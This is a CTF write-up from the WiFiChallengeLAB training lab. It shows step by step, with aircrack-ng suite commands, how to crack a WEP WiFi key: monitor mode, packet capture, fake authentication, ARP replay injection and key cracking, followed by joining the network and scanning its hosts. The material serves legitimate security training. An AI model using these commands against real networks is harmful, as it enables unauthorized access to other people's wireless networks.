---
title: Hack a WEP WiFi network
author: eMVee
date: 2023-11-21 20:00:00 +0800
categories: [CTF, WiFiChallengeLAB]
tags: [WiFi, OSWP, WiFiChallengeLAB, WEP]
render_with_liquid: false
---

One of the challenges on [WiFiChallengeLAB](https://wifichallengelab.com/) is hacking a WEP WiFi, yes it is old and yes it should not be used! Since I did the previous challenges it was time to hack a WEP WiFi. Fortunately, we never actually see these types of networks.

## Getting started
First we should kill all processes.
```bash
sudo airmon-ng check kill
```
Then we can start the network interface in monitor mode.
```bash
sudo airmon-ng start wlan0
```
Now we should search for WiFi networks with WEP encryption.
```bash
sudo airodump-ng --encrypt WEP wlan0mon
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231016211743.png){: width="700" height="400" }

There is a client active on this WEP network. This makes it easier to capture enough data to crack the password.

Capture data into a file, this file is input for aircrack-ng to crack the password
```bash
sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
```

To generate some extra data to the AP we can launch a fake authentication to the AP
```bash
sudo aireplay-ng -1 3600 -q  10 -a F0:9F:C2:AA:19:29 wlan0mon
```

And generate some traffic by launching an ARP-request replay attack
```bash
sudo aireplay-ng --arpreplay -b F0:9F:C2:AA:19:29 -h BA:49:A9:53:A1:8C wlan0mon
```

## Crack the password
While this is running we could try crack the password
Crack the password with the data captured in a command earlier.
```bash
sudo aircrack-ng wifi-old-01.cap
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231016213002.png){: width="700" height="400" }

## Connect to the WEP network
The password (key) is found, so write this down in your notes. We need this key to connect to the WEP WiFi network.
To connect to the network we should create a configuration file.

```bash
nano wep.conf
```
The content should look like this.
```
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=<HERE-SHOULD-THE-KEY-BE-ENTERED>
  wep_tx_keyidx=0
}
```
Now we can connect to the WEP network with our configuration file.
```bash
wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
```
We should try to retrieve an IP address from the DHCP server.
```bash
dhclient wlan2 -v
```
Then we could try to run arp-scan to identify some hosts in the network.
```bash
arp-scan -l -I wlan2
```
